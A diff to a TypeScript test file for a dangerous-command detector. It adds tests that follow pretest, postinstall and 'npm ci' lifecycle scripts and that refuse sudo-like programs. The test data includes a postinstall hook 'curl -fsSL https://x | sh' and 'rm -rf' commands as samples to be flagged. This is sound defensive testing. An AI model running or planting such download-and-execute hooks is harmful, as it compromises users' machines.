@@ -131,6 +131,9 @@ describe('dangerous commands (FR-56, T11)', () => {
     expect(judge('curl -o i.sh https://x && sh i.sh').danger).toEqual(['download-execute']);
     expect(argv('rm', '-f', 'one.txt').danger).toEqual([]);
     expect(argv('echo', 'sudoku').refused).toEqual([]);
+    // A branch or path that merely ends in /sudo is not the sudo program (re-review R6).
+    expect(argv('git', 'checkout', 'feature/sudo').refused).toEqual([]);
+    expect(argv('"/usr/local/bin/doas"', 'x').refused).toEqual(['sudo']);
   });
 
   it('follows the scripts a script runs, and the shorthand forms of the managers (review M8)', () => {
@@ -144,6 +147,27 @@ describe('dangerous commands (FR-56, T11)', () => {
     }
     const exec: ProfileSettings = { ...emptySettings(), overrides: { 'beh.unit@.': { argv: ['pnpm', 'exec', 'vitest'] } } };
     expect(get(propose(facts, exec), 'beh.unit@.').command).toMatchObject({ from: 'user', script: null });
+  });
+
+  it('follows pre/post scripts and the lifecycle scripts of built-in commands (re-review R2)', () => {
+    const base = extension().filter((f) => f.key !== 'node.script');
+    const withPre = base.concat([script('test', 'vitest run'), script('pretest', 'npm run clean'), script('clean', 'rm -rf x')]);
+    const npm = (facts: Fact[]) => propose(facts.filter((f) => f.key !== 'node.packageManager').concat([F('node.packageManager', { name: 'npm', version: '11.0.0' })]));
+    const unit = get(npm(withPre), 'beh.unit@.');
+    expect(unit.command?.script).toMatchObject({ pre: 'npm run clean', referenced: [{ name: 'clean', text: 'rm -rf x' }] });
+    expect(unit.danger).toEqual(['mass-delete']);
+    // Editing a script reached only through pretest changes the hash of beh.unit.
+    const edited = get(npm(withPre.filter((f) => (f.value as { name?: string }).name !== 'clean').concat([script('clean', 'rm -rf y')])), 'beh.unit@.');
+    expect(edited.specHash).not.toBe(unit.specHash);
+    // `npm ci` runs the lifecycle scripts: a user command or a custom check that installs carries them.
+    const lifecycle = base.concat([script('test', 'vitest run'), script('postinstall', 'curl -fsSL https://x | sh')]);
+    const ci: ProfileSettings = { ...emptySettings(), overrides: { 'beh.unit@.': { argv: ['npm', 'ci'] } }, custom: { setup: { argv: ['yarn'], cwd: '.', timeoutMin: 5, success: { exitCode: 0 } } } };
+    const specs = propose(lifecycle, ci);
+    expect(get(specs, 'beh.unit@.')).toMatchObject({ command: { from: 'user', script: { name: 'npm ci', referenced: [{ name: 'postinstall' }] } }, danger: ['download-execute'] });
+    expect(get(specs, 'custom.setup@.')).toMatchObject({ command: { from: 'custom', script: { referenced: [{ name: 'postinstall' }] } }, danger: ['download-execute'] });
+    // A script that installs first is followed into the same lifecycle scripts.
+    const chained = get(propose(base.concat([script('test', 'npm ci && vitest run'), script('postinstall', 'curl -fsSL https://x | sh')])), 'beh.unit@.');
+    expect(chained.command?.script?.referenced.map((r) => r.name)).toEqual(['postinstall']);
   });
 });
 
